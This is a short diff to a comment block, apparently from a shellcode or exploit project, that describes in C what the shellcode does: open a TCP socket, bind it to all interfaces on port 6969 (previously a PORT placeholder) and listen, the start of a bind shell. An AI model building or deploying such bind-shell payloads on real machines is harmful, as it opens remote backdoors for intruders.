@@ -1,11 +1,11 @@
 /*
-  ~~ shellcode runs the following C code: ~~
+  SHELLCODE CONTENTS:
 
   int sock = socket(AF_INET, SOCK_STREAM, 0);
   struct sockaddr_in address;
   memset((char *)&address, 0, sizeof(struct sockaddr_in));
   address.sin_family = AF_INET;
-  address.sin_port = htons(PORT);
+  address.sin_port = htons(6969);
   address.sin_addr.s_addr = INADDR_ANY;
   bind(sock, (struct sockaddr *)&address, sizeof(address));
   listen(sock, 0);
